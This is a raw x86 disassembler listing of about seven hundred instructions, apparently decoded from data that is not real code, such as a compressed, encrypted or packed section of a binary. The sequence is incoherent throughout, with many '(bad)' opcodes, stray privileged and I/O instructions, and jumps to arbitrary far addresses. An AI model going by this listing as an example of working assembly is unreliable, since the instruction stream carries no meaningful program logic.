  41e626:	int    0x3
  41e628:	loopne 0x41e630
  41e62a:	imul   edi,DWORD PTR [eax-0x36],0x9401dc3a
  41e631:	ins    DWORD PTR es:[edi],dx
  41e632:	dec    eax
  41e633:	ret    0x4dc5
  41e636:	sbb    esp,DWORD PTR [ebx]
  41e638:	div    BYTE PTR [ecx-0x52]
  41e63b:	or     al,0xd3
  41e63d:	xor    esi,edx
  41e63f:	xchg   esp,eax
  41e640:	dec    ecx
  41e641:	adc    DWORD PTR [esi+edx*8+0x623fec74],0xd
  41e649:	std    
  41e64a:	jbe    0x41e5f3
  41e64c:	adc    al,0x8e
  41e64e:	not    DWORD PTR [eax-0x13147141]
  41e654:	xchg   esi,eax
  41e655:	add    ecx,edx
  41e657:	jg     0x41e662
  41e659:	dec    ebp
  41e65a:	(bad)  
  41e65b:	or     esi,esp
  41e65d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e65e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e65f:	or     eax,0xe29af11f
  41e664:	out    dx,al
  41e665:	mov    al,0x52
  41e667:	or     dh,dh
  41e669:	and    edx,DWORD PTR [esi+0x3]
  41e66c:	mov    ch,0x16
  41e66e:	fs je  0x41e6ec
  41e671:	fwait
  41e672:	xor    BYTE PTR [edi+0x68],bl
  41e675:	in     eax,0xc2
  41e677:	or     eax,0xd23cb443
  41e67c:	add    edi,esp
  41e67e:	cmp    eax,0xa3a63524
  41e683:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e684:	je     0x41e6db
  41e686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e687:	or     eax,0xfd36c846
  41e68c:	pushf  
  41e68d:	and    ebp,edi
  41e68f:	stc    
  41e690:	or     al,0xd9
  41e692:	mov    al,ds:0x116e36ac
  41e697:	sar    BYTE PTR [ebx-0x6e],cl
  41e69a:	and    cl,BYTE PTR [eax+0x2993103c]
  41e6a0:	dec    edx
  41e6a1:	push   0x45
  41e6a3:	push   eax
  41e6a4:	xchg   edi,eax
  41e6a5:	xor    eax,0xe5eeb60b
  41e6aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6ab:	iret   
  41e6ac:	push   es
  41e6ad:	lea    edx,[eax-0x6e0b52e1]
  41e6b3:	not    BYTE PTR [esi-0x484a6054]
  41e6b9:	or     BYTE PTR [ecx+eiz*2-0x466888fd],0x7a
  41e6c1:	sahf   
  41e6c2:	dec    DWORD PTR [ebx+0x49]
  41e6c5:	mov    ?,WORD PTR [ebx-0x49]
  41e6c8:	loope  0x41e66f
  41e6ca:	cld    
  41e6cb:	popa   
  41e6cc:	sbb    esi,DWORD PTR [esi-0x11fe3ce5]
  41e6d2:	jmp    0x14373a7c
  41e6d7:	xchg   ebp,eax
  41e6d8:	addr16 sub esp,0x1ec3cb95
  41e6df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6e0:	and    DWORD PTR [ebx],ebp
  41e6e2:	mov    bh,0x46
  41e6e4:	inc    esi
  41e6e5:	add    ebx,edi
  41e6e7:	ins    BYTE PTR es:[edi],dx
  41e6e8:	ret    0xb9f0
  41e6eb:	xchg   edi,eax
  41e6ec:	ret    
  41e6ed:	pop    ds
  41e6ee:	xchg   esi,eax
  41e6ef:	xlat   BYTE PTR ds:[ebx]
  41e6f0:	icebp  
  41e6f1:	js     0x41e6d9
  41e6f3:	fadd   QWORD PTR [ebx-0x44]
  41e6f6:	jne    0x41e754
  41e6f8:	dec    ebp
  41e6f9:	xchg   edi,eax
  41e6fa:	xchg   ebx,eax
  41e6fb:	sahf   
  41e6fc:	mov    eax,ds:0x3148cfce
  41e701:	retf   0x732f
  41e704:	sub    DWORD PTR [ebp*4+0x142761bc],ebx
  41e70b:	fisubr WORD PTR [ebp-0x3]
  41e70e:	xchg   ebx,eax
  41e70f:	mov    bl,0xac
  41e711:	stos   DWORD PTR es:[edi],eax
  41e712:	mov    edi,0xd3210bea
  41e717:	(bad)  
  41e718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e719:	cwde   
  41e71a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e71b:	add    BYTE PTR [ebp-0x2b735ca6],bl
  41e721:	push   ss
  41e722:	cwde   
  41e723:	dec    ecx
  41e724:	call   0x949e83a5
  41e729:	xor    BYTE PTR [esi],ah
  41e72b:	in     eax,0x4e
  41e72d:	add    ax,0x4127
  41e731:	mov    bl,0x8b
  41e733:	(bad)  
  41e734:	idiv   DWORD PTR ds:0xb2ab1fc4
  41e73a:	dec    ebx
  41e73b:	sub    ebx,DWORD PTR [esi]
  41e73d:	or     esi,edx
  41e73f:	xchg   esi,eax
  41e740:	sub    cl,BYTE PTR [edi]
  41e742:	data16 cld 
  41e744:	repnz mov fs:0x5b2e4bdf,eax
  41e74b:	xlat   BYTE PTR ds:[ebx]
  41e74c:	pop    eax
  41e74d:	adc    bh,BYTE PTR [edx-0x6f2cd2d1]
  41e753:	mov    cl,0xc9
  41e755:	dec    esi
  41e756:	xor    esi,DWORD PTR [ebx-0x7f]
  41e759:	iret   
  41e75a:	outs   dx,DWORD PTR ds:[esi]
  41e75b:	ins    DWORD PTR es:[edi],dx
  41e75c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e75d:	push   es
  41e75e:	mov    ds,edi
  41e760:	ror    DWORD PTR [eax+0x4ff746bc],cl
  41e766:	mov    esp,0x6bf6406c
  41e76b:	mov    edi,0xf2d8d3a1
  41e770:	xchg   edi,eax
  41e771:	sub    esp,DWORD PTR [edx]
  41e773:	pop    es
  41e774:	in     eax,0x41
  41e776:	dec    ecx
  41e777:	pop    eax
  41e778:	loop   0x41e788
  41e77a:	or     al,0x16
  41e77c:	ins    BYTE PTR es:[edi],dx
  41e77d:	adc    eax,0x48820a22
  41e782:	sbb    al,0xc2
  41e784:	(bad)  
  41e785:	pop    edx
  41e786:	jns    0x41e803
  41e788:	xor    ebx,DWORD PTR [ebp+edx*2+0x54]
  41e78c:	rcl    DWORD PTR [esi],cl
  41e78e:	pop    ecx
  41e78f:	dec    esp
  41e790:	leave  
  41e791:	je     0x41e758
  41e793:	mov    al,ds:0xf0a75609
  41e798:	out    0xef,eax
  41e79a:	(bad)
  41e79d:	sub    al,0xc2
  41e79f:	xchg   edx,eax
  41e7a0:	sar    BYTE PTR [edi],0xf6
  41e7a3:	out    0xe4,eax
  41e7a5:	cmp    DWORD PTR [esi+0x1006f01f],0x431c1473
  41e7af:	jecxz  0x41e7de
  41e7b1:	xchg   edi,eax
  41e7b2:	std    
  41e7b3:	rcr    DWORD PTR [ebp-0x77dc10ba],cl
  41e7b9:	jmp    0x41e80d
  41e7bb:	pop    es
  41e7bc:	jae    0x41e815
  41e7be:	scas   eax,DWORD PTR es:[edi]
  41e7bf:	dec    esi
  41e7c0:	mov    ebx,0x4347836f
  41e7c5:	or     al,0x4d
  41e7c7:	xchg   edx,eax
  41e7c8:	xor    eax,0x1ec4f906
  41e7cd:	pop    eax
  41e7ce:	add    eax,0x9182709c
  41e7d3:	pop    ds
  41e7d4:	aad    0x1
  41e7d6:	push   0x36
  41e7d8:	stos   BYTE PTR es:[edi],al
  41e7d9:	xor    eax,0xac2bda78
  41e7de:	push   es
  41e7df:	or     DWORD PTR [edx-0x777baca8],ebp
  41e7e5:	idiv   al
  41e7e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7e8:	mov    ds:0xf5a7f886,eax
  41e7ed:	icebp  
  41e7ee:	jo     0x41e77f
  41e7f0:	dec    esp
  41e7f1:	jp     0x41e7a9
  41e7f3:	dec    edi
  41e7f4:	cmp    al,0xb0
  41e7f6:	mov    bh,BYTE PTR [ebx]
  41e7f8:	stc    
  41e7f9:	add    eax,0xacd56560
  41e7fe:	(bad)
  41e801:	inc    esp
  41e802:	sbb    BYTE PTR [edi-0x7bed5d00],al
  41e808:	std    
  41e809:	stos   BYTE PTR es:[edi],al
  41e80a:	loop   0x41e833
  41e80c:	jge    0x41e85c
  41e80e:	out    dx,eax
  41e80f:	fdiv   DWORD PTR [ebp+0x1bf05927]
  41e815:	pushf  
  41e816:	pop    edi
  41e817:	outs   dx,BYTE PTR ds:[esi]
  41e818:	call   0xbe6c0afc
  41e81d:	lods   eax,DWORD PTR ds:[esi]
  41e81e:	retf   
  41e81f:	and    al,0x86
  41e821:	xchg   BYTE PTR [ecx-0x6a],al
  41e824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e825:	sbb    DWORD PTR [esi+eiz*1-0x338f7ce1],ebp
  41e82c:	nop
  41e82d:	and    BYTE PTR [edx],al
  41e82f:	lea    esp,[edi]
  41e831:	bound  ebx,QWORD PTR [ecx-0x5095606b]
  41e837:	sti    
  41e838:	call   DWORD PTR [edi-0x1ab71c30]
  41e83e:	jns    0x9b729a3f
  41e844:	dec    ebx
  41e845:	push   0xffffffb9
  41e847:	adc    DWORD PTR [ebp-0x5b1a3071],ecx
  41e84d:	or     al,0xad
  41e84f:	leave  
  41e850:	dec    ebp
  41e851:	sbb    bl,cl
  41e853:	and    BYTE PTR [edx],dh
  41e855:	call   0x79a6:0xd6fe2f27
  41e85c:	shl    BYTE PTR [edx+edi*8-0x30],1
  41e860:	adc    al,0xdd
  41e862:	in     eax,0xbf
  41e864:	adc    edx,edi
  41e866:	loope  0x41e884
  41e868:	sub    eax,0x86c8072b
  41e86d:	dec    edx
  41e86e:	push   esp
  41e86f:	ins    BYTE PTR es:[edi],dx
  41e870:	xor    DWORD PTR [edi-0x496f0652],0x60
  41e877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e878:	(bad)  
  41e879:	pop    ds
  41e87a:	jge    0x41e8ce
  41e87c:	js     0x41e86b
  41e87e:	add    DWORD PTR [esi+0x44],0x9500341d
  41e885:	sub    al,0x81
  41e887:	cli    
  41e888:	(bad)  [ebx+eax*4-0x13]
  41e88c:	sub    DWORD PTR [esp-0x475da4b5],eax
  41e893:	push   ds
  41e894:	and    eax,0x1ad5576f
  41e899:	or     al,0xb1
  41e89b:	push   ss
  41e89c:	add    bh,ah
  41e89e:	(bad)  
  41e89f:	jo     0x41e904
  41e8a1:	xchg   edi,eax
  41e8a2:	adc    ebx,DWORD PTR [edx]
  41e8a4:	dec    esp
  41e8a5:	ins    BYTE PTR es:[edi],dx
  41e8a6:	mov    DWORD PTR [ebx-0x4f],edx
  41e8a9:	jge    0x41e86d
  41e8ab:	push   ebp
  41e8ac:	gs in  al,0xa8
  41e8af:	sub    al,0x75
  41e8b1:	mov    dh,0xe6
  41e8b3:	sub    eax,0x5ff6c626
  41e8b8:	or     DWORD PTR [edx+0x65c84460],ebp
  41e8be:	pop    esp
  41e8bf:	sbb    al,BYTE PTR gs:[edx+0x79]
  41e8c3:	les    ecx,FWORD PTR [ebx-0x7f]
  41e8c6:	mov    ebp,0x21f578d7
  41e8cb:	pop    ss
  41e8cc:	jle    0x41e8bc
  41e8ce:	aad    0x1f
  41e8d0:	retf   0xd41
  41e8d3:	lods   al,BYTE PTR ds:[esi]
  41e8d4:	imul   edi,edx,0x2f
  41e8d7:	xor    DWORD PTR [ebp-0x7a356be3],eax
  41e8dd:	cdq    
  41e8de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8df:	ins    DWORD PTR es:[edi],dx
  41e8e0:	or     DWORD PTR [edx-0x4dd062aa],0x4a
  41e8e7:	(bad)
  41e8ea:	repz sub bh,ch
  41e8ed:	dec    DWORD PTR [eax+edi*1]
  41e8f0:	or     eax,0x7c74348b
  41e8f5:	xchg   DWORD PTR [eax],ecx
  41e8f7:	dec    ebx
  41e8f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8f9:	(bad)  
  41e8fa:	(bad)  
  41e8fb:	test   eax,0xa2dc8773
  41e900:	outs   dx,DWORD PTR ds:[esi]
  41e901:	mov    esp,0xfdba688
  41e906:	jb     0x41e8ea
  41e908:	xlat   BYTE PTR ds:[ebx]
  41e909:	sbb    dl,BYTE PTR [ecx+0x69]
  41e90c:	pop    esi
  41e90d:	popa   
  41e90e:	push   edi
  41e90f:	ja     0x41e8e2
  41e911:	inc    eax
  41e912:	push   esi
  41e913:	stc    
  41e914:	fdiv   st,st(2)
  41e916:	fcomp  DWORD PTR [ecx+0x32e0e0f3]
  41e91c:	into   
  41e91d:	sbb    eax,0x5b3cd5a5
  41e922:	mov    ah,0x11
  41e925:	into   
  41e926:	jl     0x41e98e
  41e928:	pop    ds
  41e929:	repnz mov eax,ds:0x974ef659
  41e92f:	cdq    
  41e930:	ror    DWORD PTR [edi],cl
  41e932:	lock mov ebp,0xc6b5ab9f
  41e938:	xor    DWORD PTR [edx+0x77],esi
  41e93b:	pusha  
  41e93c:	push   ebp
  41e93d:	mov    ?,ebp
  41e93f:	outs   dx,BYTE PTR ds:[esi]
  41e940:	pop    ecx
  41e941:	sub    eax,0x5c9383c1
  41e946:	push   ebp
  41e947:	in     al,0x17
  41e949:	lahf   
  41e94a:	mov    esi,0xaef6d21d
  41e94f:	mov    BYTE PTR [ecx],bl
  41e951:	pusha  
  41e952:	mov    esp,0x162af66b
  41e957:	lods   eax,DWORD PTR ds:[esi]
  41e958:	jmp    DWORD PTR [ebx+esi*2]
  41e95b:	sub    ch,BYTE PTR [ecx+ebx*4]
  41e95e:	mov    ecx,0x4b99ad12
  41e963:	jmp    0x41e9c1
  41e965:	js     0x41e977
  41e967:	cmc    
  41e968:	mov    ch,0x5b
  41e96a:	adc    eax,0xa26bb94a
  41e96f:	cmp    al,0x86
  41e971:	jge    0x41e9ef
  41e973:	scas   eax,DWORD PTR es:[edi]
  41e974:	xchg   edx,eax
  41e975:	mov    esi,0x8973638d
  41e97a:	neg    BYTE PTR [edi]
  41e97c:	xor    edi,DWORD PTR [ecx-0x5cb362a8]
  41e982:	hlt    
  41e983:	sub    esi,0xefffb666
  41e989:	pop    esp
  41e98a:	enter  0x907f,0x50
  41e98e:	cmp    DWORD PTR ds:0x7a679ff1,ebx
  41e994:	cmp    ah,BYTE PTR [esi+0x59]
  41e997:	mov    esp,ebx
  41e999:	jle    0x41e987
  41e99b:	call   0x21dd4eab
  41e9a0:	ret    
  41e9a1:	inc    ebx
  41e9a2:	je     0x41e995
  41e9a4:	in     eax,dx
  41e9a5:	mov    ebx,0x50ac7527
  41e9aa:	aaa    
  41e9ab:	in     al,dx
  41e9ac:	in     eax,dx
  41e9ad:	sub    DWORD PTR [esi+0x4872df1],edx
  41e9b3:	std    
  41e9b4:	push   ecx
  41e9b5:	enter  0xbbf4,0xf1
  41e9b9:	mov    dh,0xca
  41e9bb:	mov    ecx,0x41012d57
  41e9c0:	inc    ebx
  41e9c1:	or     dl,BYTE PTR [eax]
  41e9c3:	add    edi,ebx
  41e9c5:	mov    BYTE PTR [ebp+0x42],bl
  41e9c8:	push   es
  41e9c9:	push   cs
  41e9ca:	test   eax,0x3ab5464d
  41e9cf:	pop    ebx
  41e9d0:	and    esp,ebp
  41e9d2:	(bad)  
  41e9d3:	into   
  41e9d4:	sbb    eax,DWORD PTR [edx]
  41e9d6:	ficomp DWORD PTR [ecx]
  41e9d8:	fs fs jp 0x41e97c
  41e9dc:	bound  eax,QWORD PTR [esi-0x1a]
  41e9df:	sub    edi,DWORD PTR [edi]
  41e9e1:	dec    esp
  41e9e2:	icebp  
  41e9e3:	dec    eax
  41e9e4:	cmc    
  41e9e5:	out    0x61,al
  41e9e7:	add    BYTE PTR [ebx],cl
  41e9e9:	mov    BYTE PTR [esi+ecx*1+0xe950615],0xb2
  41e9f1:	pop    eax
  41e9f2:	add    eax,0xa442423
  41e9f7:	sub    ch,0x93
  41e9fa:	fst    QWORD PTR [edi-0x555bdca9]
  41ea00:	jmp    0x3411:0xc4108359
  41ea07:	dec    ecx
  41ea08:	scas   al,BYTE PTR es:[edi]
  41ea09:	jo     0x41e9cf
  41ea0b:	int    0xc9
  41ea0d:	dec    edi
  41ea0e:	mov    ebp,0x965340b1
  41ea13:	mov    dh,0xda
  41ea15:	mov    ds:0xb8649efb,eax
  41ea1a:	dec    edx
  41ea1b:	(bad)  
  41ea1c:	repz sahf 
  41ea1e:	sbb    edi,DWORD PTR [esi]
  41ea20:	dec    edi
  41ea21:	jge    0x41ea82
  41ea23:	repz ja 0x41e9ef
  41ea26:	(bad)  
  41ea27:	jae    0x41e9ea
  41ea29:	fs inc eax
  41ea2b:	adc    ch,BYTE PTR [edx+0x58a2debd]
  41ea31:	sbb    BYTE PTR [edx+0x1],cl
  41ea34:	mov    ds:0x87b44ba0,al
  41ea39:	adc    DWORD PTR [esi-0x4e],esp
  41ea3c:	arpl   WORD PTR [edi],cx
  41ea3e:	add    ecx,DWORD PTR [edi-0x7a]
  41ea41:	and    bh,BYTE PTR [ecx]
  41ea43:	or     eax,0xdccd6fe0
  41ea48:	push   ebx
  41ea49:	pop    esp
  41ea4a:	jge    0x41ea0c
  41ea4c:	and    eax,0xa53dd935
  41ea51:	dec    edi
  41ea52:	not    eax
  41ea54:	outs   dx,BYTE PTR ds:[esi]
  41ea55:	fstp   st(6)
  41ea57:	cwde   
  41ea58:	jp     0x41eac3
  41ea5a:	scas   eax,DWORD PTR es:[edi]
  41ea5b:	enter  0xc7df,0xca
  41ea5f:	adc    DWORD PTR [ebx+0x25],eax
  41ea62:	mov    esp,0x9b4abb4f
  41ea67:	cld    
  41ea68:	or     bh,BYTE PTR [eax]
  41ea6a:	dec    DWORD PTR [edx]
  41ea6c:	xor    DWORD PTR ds:0x5b937b1e,ebp
  41ea72:	adc    DWORD PTR [ecx],edi
  41ea74:	ss gs lock jmp 0xc1169539
  41ea7c:	add    edi,DWORD PTR [edi]
  41ea7e:	fld    DWORD PTR [edi-0x47]
  41ea81:	shl    DWORD PTR [edx-0x50],0x57
  41ea85:	sahf   
  41ea86:	dec    edi
  41ea87:	icebp  
  41ea88:	xlat   BYTE PTR ds:[ebx]
  41ea89:	pop    ds
  41ea8a:	jmp    0xe26:0x4a336075
  41ea91:	xchg   esp,eax
  41ea92:	dec    edi
  41ea93:	(bad)  
  41ea94:	rcr    DWORD PTR [eax],cl
  41ea96:	push   ecx
  41ea97:	xchg   edx,eax
  41ea98:	push   es
  41ea99:	mov    ds:0xd261d937,al
  41ea9e:	mov    BYTE PTR [edx+edx*8+0x3d7705c9],bh
  41eaa5:	out    dx,eax
  41eaa6:	pop    ebx
  41eaa7:	push   ds
  41eaa8:	ficom  DWORD PTR [edi]
  41eaaa:	loopne 0x41ea4a
  41eaac:	sub    DWORD PTR [edx+0x15],0x37
  41eab0:	adc    al,0x3f
  41eab2:	jmp    0xc0ed25e6
  41eab7:	sbb    al,0x4a
  41eab9:	xchg   ecx,eax
  41eaba:	mov    ebx,DWORD PTR [esi-0x5be03cc5]
  41eac0:	cwde   
  41eac1:	mov    edi,0xeb8b493b
  41eac6:	mov    dl,0x62
  41eac8:	cmp    DWORD PTR [edx-0x8],esp
  41eacb:	stos   DWORD PTR es:[edi],eax
  41eacc:	adc    al,0xfa
  41eace:	mov    edi,0x7a0abdf3
  41ead3:	add    DWORD PTR [edx+edx*2+0x12],esi
  41ead7:	lea    esp,[ecx+0x632ff13d]
  41eadd:	jmp    DWORD PTR [edx+0x9603a1e]
  41eae3:	aaa    
  41eae4:	push   ebp
  41eae5:	push   eax
  41eae6:	fldenv [ecx+0xf7631ac]
  41eaec:	mov    cl,0x80
  41eaee:	lahf   
  41eaef:	icebp  
  41eaf0:	lods   al,BYTE PTR ds:[esi]
  41eaf1:	pushf  
  41eaf2:	(bad)  
  41eaf3:	push   edx
  41eaf4:	mov    edx,ss
  41eaf6:	or     BYTE PTR [esi-0x5a8baf4f],ch
  41eafc:	rcl    bl,1
  41eafe:	cmp    bl,BYTE PTR [ecx-0x37cd1a2a]
  41eb04:	stos   BYTE PTR es:[edi],al
  41eb05:	lahf   
  41eb06:	in     eax,dx
  41eb07:	sbb    eax,0x2e186a17
  41eb0c:	mov    edx,0xeb17a423
  41eb11:	mov    ch,0x1
  41eb13:	aad    0x64
  41eb15:	push   0x0
  41eb17:	test   BYTE PTR [edi-0x78],al
  41eb1a:	add    al,0xf1
  41eb1c:	add    esp,ecx
  41eb1e:	in     al,dx
  41eb1f:	add    BYTE PTR [eax],0xe4
  41eb22:	outs   dx,DWORD PTR ds:[esi]
  41eb23:	popa   
  41eb24:	mov    edi,0x970f7fc1
  41eb29:	fnstenv [esi]
  41eb2b:	dec    esi
  41eb2c:	inc    ebx
  41eb2d:	rol    DWORD PTR [edi-0x6e],0xd
  41eb31:	loope  0x41eb47
  41eb33:	test   bl,dl
  41eb35:	jae    0x41eb16
  41eb37:	pop    ebx
  41eb38:	mov    esp,DWORD PTR [esi-0xb4c0f86]
  41eb3e:	nop
  41eb3f:	and    BYTE PTR [ebp-0x36],bl
  41eb42:	test   al,0x20
  41eb44:	jbe    0x41ebbb
  41eb46:	jne    0x41ebae
  41eb48:	jmp    0x41ebb2
  41eb4a:	mov    cl,ch
  41eb4c:	adc    esp,edx
  41eb4e:	inc    edx
  41eb4f:	sub    al,0xff
  41eb51:	aad    0x4e
  41eb53:	(bad)  
  41eb54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb55:	pop    eax
  41eb56:	or     ch,bh
  41eb58:	push   ds
  41eb59:	bound  eax,QWORD PTR [edi-0x50]
  41eb5c:	fcmovne st,st(3)
  41eb5e:	lea    ebx,[edx-0x18f36098]
  41eb64:	leave  
  41eb65:	jb     0x41ebc4
  41eb67:	test   BYTE PTR [eax+0x60],bh
  41eb6a:	inc    edi
  41eb6b:	pop    ebx
  41eb6c:	fcmovne st,st(1)
  41eb6e:	pop    ds
  41eb6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb70:	mov    dh,0xac
  41eb72:	sbb    eax,0xa5857451
  41eb77:	jle    0x41ebf8
  41eb79:	and    DWORD PTR [ecx],ecx
  41eb7b:	adc    dl,dh
  41eb7d:	(bad)  
  41eb7e:	mov    eax,0xf330427c
  41eb83:	daa    
  41eb84:	shl    BYTE PTR [esi-0x5691a0f4],cl
  41eb8a:	mov    cl,BYTE PTR [esi-0x1e745cf0]
  41eb90:	xlat   BYTE PTR ds:[ebx]
  41eb91:	pusha  
  41eb92:	mov    ebx,DWORD PTR [eax+0x3b1aaf2a]
  41eb98:	fcomp  QWORD PTR [ecx-0x7d]
  41eb9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb9c:	aas    
  41eb9d:	test   al,0xe8
  41eb9f:	jns    0x41eba7
  41eba1:	add    DWORD PTR [esi+0x3b],edx
  41eba4:	mov    cl,0x3
  41eba6:	pop    ds
  41eba7:	pop    edi
  41eba8:	mov    edx,DWORD PTR [ebx+eax*8+0x361b3f42]
  41ebaf:	push   esi
  41ebb0:	xchg   ebp,eax
  41ebb1:	pop    ebx
  41ebb2:	cmc    
  41ebb3:	pop    ebp
  41ebb4:	imul   eax,DWORD PTR es:[ecx-0x9],0xa53ac265
  41ebbc:	ret    
  41ebbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebbe:	sub    eax,0x9bff1934
  41ebc3:	sub    bl,al
  41ebc5:	mov    DWORD PTR [eax+0x49],esp
  41ebc8:	lock stos BYTE PTR es:[edi],al
  41ebca:	push   ebp
  41ebcb:	and    dh,BYTE PTR [ebx-0x16]
  41ebce:	inc    esi
  41ebcf:	add    al,0xfc
  41ebd1:	and    DWORD PTR [ecx+ecx*8],ecx
  41ebd4:	imul   edi,DWORD PTR [ebp+0x6a],0x1dcda8db
  41ebdb:	fwait
  41ebdc:	inc    ecx
  41ebdd:	xor    BYTE PTR [ebx+edx*8+0x79],bl
  41ebe1:	je     0x41ebd4
  41ebe3:	mov    eax,ebp
  41ebe5:	sti    
  41ebe6:	jp     0x41ec2a
  41ebe8:	push   ebp
  41ebe9:	in     al,0x5f
  41ebeb:	and    DWORD PTR [ebp-0x194c430d],0x6
  41ebf2:	sbb    edi,edi
  41ebf4:	jmp    0x71f50584
  41ebf9:	inc    edx
  41ebfa:	dec    esp
  41ebfb:	scas   al,BYTE PTR es:[edi]
  41ebfc:	nop
  41ebfd:	push   ebp
  41ebfe:	int3   
  41ebff:	(bad)  
  41ec00:	leave  
  41ec01:	lods   al,BYTE PTR ds:[esi]
  41ec02:	xchg   edi,eax
  41ec03:	shr    DWORD PTR [esi+0x66],1
  41ec06:	dec    eax
  41ec07:	mov    ch,0x6d
  41ec09:	lahf   
  41ec0a:	xor    edx,DWORD PTR [ebp*1-0x42e9e32c]
  41ec11:	mov    bl,0xad
  41ec13:	dec    edi
  41ec14:	imul   eax,ebp,0x2d6b9cd
  41ec1a:	out    dx,al
  41ec1b:	fisttp DWORD PTR [edx+0x73]
  41ec1e:	shr    BYTE PTR fs:0x3cf8905b,1
  41ec25:	aas    
  41ec26:	retf   
  41ec27:	mov    eax,0x3798df4b
  41ec2c:	sbb    edx,DWORD PTR [esp+ecx*4+0x68]
  41ec30:	xchg   edx,eax
  41ec31:	jmp    0x41eca1
  41ec33:	enter  0xb930,0x5f
  41ec37:	xchg   ebx,eax
  41ec38:	mov    esi,0x6d9d9dc3
  41ec3d:	and    al,0xc8
  41ec3f:	jae    0x41ec0f
  41ec41:	mov    cl,0xe8
  41ec43:	test   DWORD PTR [ecx],edx
  41ec45:	std    
  41ec46:	and    bh,BYTE PTR [esi+0x2b734779]
  41ec4c:	push   edi
  41ec4d:	add    eax,0x7a0a28f9
  41ec52:	fwait
  41ec53:	or     edi,DWORD PTR [ebx+0x41]
  41ec56:	mov    esi,0x1952cfe4
  41ec5b:	mov    al,0xac
  41ec5d:	(bad)  
  41ec5e:	call   0x967:0x64a5fcf0
  41ec65:	xlat   BYTE PTR ds:[ebx]
  41ec66:	add    eax,0x81423150
  41ec6b:	inc    BYTE PTR [edx+0x4e]
  41ec6e:	sbb    al,0xf5
  41ec70:	pop    eax
  41ec71:	adc    ah,BYTE PTR [ebp+edi*2+0x5]
  41ec75:	push   eax
  41ec76:	aas    
  41ec77:	mov    al,ds:0x7653eaea
  41ec7c:	mov    bh,0xe6
  41ec7e:	xor    edi,ebp
  41ec80:	xor    eax,0xc4da3b69
  41ec85:	pop    ebx
  41ec86:	add    DWORD PTR [edx-0x1a],edx
  41ec89:	mov    esi,0xba88d976
  41ec8e:	lds    esp,FWORD PTR [si-0x70e3]
  41ec93:	jp     0x41ec7a
  41ec95:	retf   0xff7
  41ec98:	nop
  41ec99:	pop    ebx
  41ec9a:	icebp  
  41ec9b:	add    ebp,DWORD PTR [edi-0x2e]
  41ec9e:	loopne 0x41ec40
  41eca0:	dec    esp
  41eca1:	add    DWORD PTR [ebp+0x34],edx
  41eca4:	fmul   QWORD PTR [eax-0x40cb86d]
  41ecaa:	adc    eax,0x37631070
  41ecaf:	mov    DWORD PTR [ebx+0x675e7085],0xa555870c
  41ecb9:	cvtdq2ps xmm0,XMMWORD PTR [eax+0x0]
  41ecbd:	dec    esp
  41ecbe:	xchg   edx,eax
  41ecbf:	push   esi
  41ecc0:	mov    ebp,0x3f6cca11
  41ecc5:	fimul  WORD PTR [ecx+0x60]
  41ecc8:	inc    eax
  41ecc9:	(bad)  
  41ecca:	jae    0x41ed2b
  41eccc:	sar    DWORD PTR [ecx],1
  41ecce:	stos   BYTE PTR es:[edi],al
  41eccf:	cpuid  
  41ecd1:	mov    eax,0xfd79cb26
  41ecd6:	inc    ebx
  41ecd7:	mov    bl,BYTE PTR [ecx+eiz*1]
  41ecda:	and    al,0xdb
  41ecdc:	imul   ebx,DWORD PTR [ebx+0x4],0x629c0e95
  41ece3:	push   0xb1e7e7f3
  41ece8:	jae    0x41ed3a
  41ecea:	inc    eax
  41eceb:	(bad)  
  41ecec:	leave  
  41eced:	pop    esi
  41ecee:	add    al,0x42
  41ecf0:	sbb    bh,BYTE PTR [edi+0x74bbf2f5]
  41ecf6:	jo     0x41ecbc
  41ecf8:	pop    edi
  41ecf9:	jl     0x41ed55
  41ecfb:	je     0x41ecb4
  41ecfd:	out    0x24,eax
  41ecff:	setg   dl
  41ed02:	loopne 0x41ec86
  41ed04:	loopne 0x41ecf8
  41ed06:	lock test edx,ebx
  41ed09:	adc    DWORD PTR [eax+0x53],0x0
  41ed0d:	(bad)  
  41ed0e:	add    edx,0xffffffec
  41ed11:	jmp    0xde07:0x19758925
  41ed18:	ins    DWORD PTR es:[edi],dx
  41ed19:	sub    DWORD PTR [ebx+ebx*4],esp
  41ed1c:	imul   edi,esi,0xe
  41ed1f:	lods   al,BYTE PTR ds:[esi]
  41ed20:	adc    BYTE PTR [ebp-0x4f0217ad],dh
  41ed26:	ja     0x41ecb6
  41ed28:	fld    TBYTE PTR [esi+0x1e]
  41ed2b:	cmp    al,0xae
  41ed2d:	mov    WORD PTR [ebp+0x4a01f4d3],?
  41ed33:	aad    0x9f
  41ed35:	jb     0x41ed2f
  41ed37:	jbe    0x41ecc9
  41ed39:	popa   
  41ed3a:	sbb    BYTE PTR [ebp-0x5a],bl
  41ed3d:	int    0x43
  41ed3f:	and    eax,0x96c7dfd7
  41ed44:	inc    ebx
  41ed45:	cld    
  41ed46:	fstp   QWORD PTR ds:0x25d368a9
  41ed4c:	sub    eax,0x2c560a7a
  41ed51:	and    BYTE PTR [edi],cl
  41ed53:	nop
  41ed54:	fs jl  0x41ed47
  41ed57:	push   ds
  41ed58:	sub    al,dh
  41ed5a:	dec    eax
  41ed5b:	sbb    DWORD PTR ds:0xe4756b62,0xffffff9b
  41ed62:	in     eax,0xae
  41ed64:	loope  0x41ed20
  41ed66:	jo     0x41ed3a
  41ed68:	retf   
